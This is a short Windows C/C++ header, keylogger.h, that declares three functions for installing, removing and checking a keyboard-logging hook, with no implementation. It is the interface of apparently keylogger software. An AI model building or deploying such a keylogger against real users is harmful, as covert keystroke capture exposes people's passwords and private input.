#ifndef		__keylogger_h__
#define		__keylogger_h__

#include <windows.h>


//*********************************************************************
bool UnHookKeyLogger();

//*********************************************************************
bool HookKeyLogger();

//*********************************************************************
bool WINAPI IsKeyLoggerProcess();

#endif		//__keylogger_h__